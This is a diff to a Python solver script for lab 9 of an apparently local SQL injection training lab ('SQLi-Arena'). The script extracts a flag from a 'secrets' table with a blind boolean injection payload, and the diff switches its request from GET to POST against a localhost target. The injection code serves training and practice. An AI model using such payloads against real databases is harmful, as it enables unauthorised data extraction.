@@ -6,15 +6,15 @@ Extracts the flag from the 'secrets' table character by character
 using a boolean oracle (different responses for TRUE vs FALSE).
 
 Usage:
-    python3 lab9_blind_boolean.py [TARGET_URL]
+    python3 lab9_blind_boolean.py [BASE_URL]
 
-Default target: http://localhost/SQLi-Arena/public/lab.php
+Default target: http://localhost/SQLi-Arena
 """
 import requests
 import sys
 
-TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost/SQLi-Arena/public/lab.php"
-PARAMS_BASE = {"lab": "mysql/lab9", "mode": "black"}
+BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost/SQLi-Arena"
+TARGET = f"{BASE}/mysql/lab9"
 
 # Boolean oracle markers (check the HTML response)
 TRUE_MARKER = "result-data"      # present when the member IS found (active)
@@ -24,8 +24,7 @@ FALSE_MARKER = "result-warning"  # present when the member is NOT found
 def check(condition):
     """Inject a boolean condition and return True if the oracle says TRUE."""
     payload = f"admin' AND {condition} -- -"
-    params = {**PARAMS_BASE, "user": payload}
-    r = requests.get(TARGET, params=params)
+    r = requests.post(TARGET, data={"user": payload})
     return TRUE_MARKER in r.text
 
 
